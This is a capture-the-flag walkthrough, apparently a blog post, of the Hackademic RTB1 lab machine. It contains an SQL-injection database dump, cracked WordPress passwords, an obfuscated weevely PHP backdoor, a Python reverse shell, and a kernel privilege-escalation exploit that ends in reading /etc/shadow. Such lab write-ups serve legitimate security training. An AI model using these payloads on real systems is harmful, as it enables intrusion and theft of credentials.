-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://192.168.80.146/Hackademic_RTB1/?cat=1" --dump-all</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Some of the output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>--current-user:
-</span><span class='line'>current user:    'root@localhost'
-</span><span class='line'>--current-db:
-</span><span class='line'>current database:    'wordpress'
-</span><span class='line'>--privileges:
-</span><span class='line'>[*] 'root'@'localhost' (administrator) [27]:
-</span><span class='line'>    privilege: ALTER
-</span><span class='line'>    privilege: ALTER ROUTINE
-</span><span class='line'>    privilege: CREATE
-</span><span class='line'>    privilege: CREATE ROUTINE
-</span><span class='line'>    privilege: CREATE TEMPORARY TABLES
-</span><span class='line'>    privilege: CREATE USER
-</span><span class='line'>    privilege: CREATE VIEW
-</span><span class='line'>    privilege: DELETE
-</span><span class='line'>    privilege: DROP
-</span><span class='line'>    privilege: EVENT
-</span><span class='line'>    privilege: EXECUTE
-</span><span class='line'>    privilege: FILE
-</span><span class='line'>    privilege: INDEX
-</span><span class='line'>    privilege: INSERT
-</span><span class='line'>    privilege: LOCK TABLES
-</span><span class='line'>    privilege: PROCESS
-</span><span class='line'>    privilege: REFERENCES
-</span><span class='line'>    privilege: RELOAD
-</span><span class='line'>    privilege: REPLICATION CLIENT
-</span><span class='line'>    privilege: REPLICATION SLAVE
-</span><span class='line'>    privilege: SELECT
-</span><span class='line'>    privilege: SHOW DATABASES
-</span><span class='line'>    privilege: SHOW VIEW
-</span><span class='line'>    privilege: SHUTDOWN
-</span><span class='line'>    privilege: SUPER
-</span><span class='line'>    privilege: TRIGGER
-</span><span class='line'>    privilege: UPDATE
-</span><span class='line'>--passwords:
-</span><span class='line'>database management system users password hashes:
-</span><span class='line'>[*] root [1]:
-</span><span class='line'>    password hash: 2eaec110380126d7</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The wordpress could be scanned using wpscan too:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan http://192.168.80.146/Hackademic_RTB1</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv 
-</span><span class='line'>ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
-</span><span class='line'>1,login,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,&lt;blank>,&lt;blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,&lt;blank>,&lt;blank>
-</span><span class='line'>2,login,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,&lt;blank>,&lt;blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,&lt;blank>,&lt;blank>
-</span><span class='line'>3,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,&lt;blank>,&lt;blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,&lt;blank>,&lt;blank>
-</span><span class='line'>4,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,&lt;blank>,&lt;blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,&lt;blank>,&lt;blank>
-</span><span class='line'>5,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,&lt;blank>,&lt;blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,&lt;blank>,&lt;blank>
-</span><span class='line'>6,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,&lt;blank>,&lt;blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,&lt;blank>,&lt;blank></span></code></pre></td></tr></table></div></figure>
-
-
-<p>&ldquo;GeorgeMiller:q1w2e3&rdquo; has the highest privileges (user_level 10).</p>
-
-<p>We crack the hashes:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep "^[0-9]+" wp_users.csv| awk -F, '{print $10 ":"  $9}'  > /tmp/wp_users.john
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john --format=raw-md5 
-</span><span class='line'>Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
-</span><span class='line'>NickJames:admin
-</span><span class='line'>JohnSmith:PUPPIES
-</span><span class='line'>GeorgeMiller:q1w2e3
-</span><span class='line'>TonyBlack:napoleon
-</span><span class='line'>JasonKonnors:maxwell
-</span><span class='line'>MaxBucky:kernel
-</span><span class='line'>guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
-</span><span class='line'>Use the "--show" option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We log in using GeorgeMiller&rsquo;s account and under &ldquo;Manage -> Files&rdquo; we upload the generated weevely shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
-</span><span class='line'><span class="o">[</span>generate.php<span class="o">]</span> Backdoor file <span class="s1">&#39;weevely.php&#39;</span> created with password <span class="s1">&#39;1234&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">kali32</span><span class="o">:~/.</span><span class="nx">sqlmap</span><span class="o">/</span><span class="nx">output</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">80.146</span><span class="o">/</span><span class="nx">dump</span><span class="o">/</span><span class="nx">wordpress</span><span class="c1"># cat weevely.php </span>
-</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'><span class="nv">$duiq</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;sc&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;scssctscrsc_scrsceplscasccsce&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="nv">$lucw</span><span class="o">=</span><span class="s2">&quot;MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$udtq</span><span class="o">=</span><span class="s2">&quot;JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$foif</span><span class="o">=</span><span class="s2">&quot;IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30=&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$kvzf</span><span class="o">=</span><span class="s2">&quot;wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$tkjs</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;bvavsve6v4v_vdvevcvovdve&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="nv">$nqkm</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;dcdrdedatded_fudncdtdidodn&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="nv">$itsd</span> <span class="o">=</span> <span class="nv">$nqkm</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$tkjs</span><span class="p">(</span><span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;woh&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$udtq</span><span class="o">.</span><span class="nv">$lucw</span><span class="o">.</span><span class="nv">$kvzf</span><span class="o">.</span><span class="nv">$foif</span><span class="p">)));</span> <span class="nv">$itsd</span><span class="p">();</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We connect using weevely and found out the mysql root password:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php 1234
-</span><span class='line'>
-</span><span class='line'>root:x:0:0:root:/root:/bin/bash
-</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
-</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
-</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
-</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
-</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
-</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
-</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
-</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
-</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
-</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
-</span><span class='line'>vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
-</span><span class='line'>avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
-</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
-</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
-</span><span class='line'>rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
-</span><span class='line'>nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
-</span><span class='line'>tcpdump:x:72:72::/:/sbin/nologin
-</span><span class='line'>avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
-</span><span class='line'>haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
-</span><span class='line'>openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
-</span><span class='line'>apache:x:48:489:Apache:/var/www:/sbin/nologin
-</span><span class='line'>saslauth:x:495:488:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
-</span><span class='line'>mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
-</span><span class='line'>smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
-</span><span class='line'>smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
-</span><span class='line'>sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-</span><span class='line'>pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
-</span><span class='line'>gdm:x:42:481::/var/lib/gdm:/sbin/nologin
-</span><span class='line'>p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
-</span><span class='line'>mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">@</span><span class="nx">HackademicRTB1</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">Hackademic_RTB1</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">config</span><span class="o">.</span><span class="nx">php</span>
-</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'><span class="c1">// ** MySQL settings ** //</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;wordpress&#39;</span><span class="p">);</span>     <span class="c1">// The name of the database</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>     <span class="c1">// Your MySQL username</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;lz5yedns&#39;</span><span class="p">);</span> <span class="c1">// ...and password</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>     <span class="c1">// 99% chance you won&#39;t need to change this value</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">// Change the prefix if you want to have multiple blogs in a single database.</span>
-</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="s1">&#39;wp_&#39;</span><span class="p">;</span>   <span class="c1">// example: &#39;wp_&#39; or &#39;b2&#39; or &#39;mylogin_&#39;</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">// Change this to localize WordPress.  A corresponding MO file for the</span>
-</span><span class='line'><span class="c1">// chosen language must be installed to wp-includes/languages.</span>
-</span><span class='line'><span class="c1">// For example, install de.mo to wp-includes/languages and set WPLANG to &#39;de&#39;</span>
-</span><span class='line'><span class="c1">// to enable German language support.</span>
-</span><span class='line'><span class="nb">define</span> <span class="p">(</span><span class="s1">&#39;WPLANG&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="cm">/* Stop editing */</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;ABSPATH&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
-</span><span class='line'><span class="k">require_once</span><span class="p">(</span><span class="nx">ABSPATH</span><span class="o">.</span><span class="s1">&#39;wp-settings.php&#39;</span><span class="p">);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Because our web shell doesn&rsquo;t have assigned tty, we use python to create another reverse shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>@HackademicRTB1:/tmp <span class="nv">$ </span>sudo -l
-</span><span class='line'>sudo: sorry, you must have a tty to run sudo
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="p">:</span><span class="o">~</span><span class="c"># nc -lp 1338</span>
-</span><span class='line'>
-</span><span class='line'><span class="nd">@HackademicRTB1</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&#39;/bin/bash&#39;)&quot;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1338</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>For privilege escalation, we use the following exploit:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali32</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="err">#</span> <span class="n">head</span> <span class="n">platforms</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="mf">15285.</span><span class="n">c</span>
-</span><span class='line'><span class="c1">//source: http://www.vsecurity.com/resources/advisory/20101019-1/</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">/*</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">Linux</span> <span class="n">Kernel</span> <span class="o">&lt;=</span> <span class="mf">2.6.36</span><span class="o">-</span><span class="n">rc8</span> <span class="n">RDS</span> <span class="n">privilege</span> <span class="n">escalation</span> <span class="n">exploit</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2010</span><span class="o">-</span><span class="mi">3904</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">by</span> <span class="n">Dan</span> <span class="n">Rosenberg</span> <span class="o">&lt;</span><span class="n">drosenberg</span><span class="err">@</span><span class="n">vsecurity</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span>
-</span><span class='line'> <span class="o">*</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">Copyright</span> <span class="mi">2010</span> <span class="n">Virtual</span> <span class="n">Security</span> <span class="n">Research</span><span class="p">,</span> <span class="n">LLC</span>
-</span><span class='line'> <span class="o">*</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">The</span> <span class="n">handling</span> <span class="n">functions</span> <span class="k">for</span> <span class="n">sending</span> <span class="n">and</span> <span class="n">receiving</span> <span class="n">RDS</span> <span class="n">messages</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.0<span class="nv">$ </span>wget --no-check-certificate https://www.exploit-db.com/download/15285 -O a.c
-</span><span class='line'>bash-4.0<span class="nv">$ </span>gcc a.c
-</span><span class='line'>gcc a.c
-</span><span class='line'>bash-4.0<span class="nv">$ </span>./a.out
-</span><span class='line'>./a.out
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Linux kernel &gt;<span class="o">=</span> 2.6.30 RDS socket exploit
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> by Dan Rosenberg
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving kernel addresses...
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved security_ops to 0xc0aa19ac
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved default_security_ops to 0xc0955c6c
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved cap_ptrace_traceme to 0xc055d9d7
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved commit_creds to 0xc044e5f1
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved prepare_kernel_cred to 0xc044e452
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Overwriting security ops...
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Overwriting <span class="k">function</span> pointer...
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Triggering payload...
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Restoring <span class="k">function</span> pointer...
-</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got root!
-</span><span class='line'>sh-4.0# id
-</span><span class='line'>id
-</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span><span class='line'>
-</span><span class='line'>sh-4.0# cat /etc/shadow
-</span><span class='line'>cat /etc/shadow
-</span><span class='line'>root:<span class="nv">$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU</span>/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
-</span><span class='line'>bin:*:14495:0:99999:7:::
-</span><span class='line'>daemon:*:14495:0:99999:7:::
-</span><span class='line'>adm:*:14495:0:99999:7:::
-</span><span class='line'>lp:*:14495:0:99999:7:::
-</span><span class='line'>sync:*:14495:0:99999:7:::
-</span><span class='line'>shutdown:*:14495:0:99999:7:::
-</span><span class='line'>halt:*:14495:0:99999:7:::
-</span><span class='line'>mail:*:14495:0:99999:7:::
-</span><span class='line'>uucp:*:14495:0:99999:7:::
-</span><span class='line'>operator:*:14495:0:99999:7:::
-</span><span class='line'>games:*:14495:0:99999:7:::
-</span><span class='line'>gopher:*:14495:0:99999:7:::
-</span><span class='line'>ftp:*:14495:0:99999:7:::
-</span><span class='line'>nobody:*:14495:0:99999:7:::
-</span><span class='line'>vcsa:!!:14557::::::
-</span><span class='line'>avahi-autoipd:!!:14557::::::
-</span><span class='line'>ntp:!!:14557::::::
-</span><span class='line'>dbus:!!:14557::::::
-</span><span class='line'>rtkit:!!:14557::::::
-</span><span class='line'>nscd:!!:14557::::::
-</span><span class='line'>tcpdump:!!:14557::::::
-</span><span class='line'>avahi:!!:14557::::::
-</span><span class='line'>haldaemon:!!:14557::::::
-</span><span class='line'>openvpn:!!:14557::::::
-</span><span class='line'>apache:!!:14557::::::
-</span><span class='line'>saslauth:!!:14557::::::
-</span><span class='line'>mailnull:!!:14557::::::
-</span><span class='line'>smmsp:!!:14557::::::
-</span><span class='line'>smolt:!!:14557::::::
-</span><span class='line'>sshd:!!:14557::::::
-</span><span class='line'>pulse:!!:14557::::::
-</span><span class='line'>gdm:!!:14557::::::
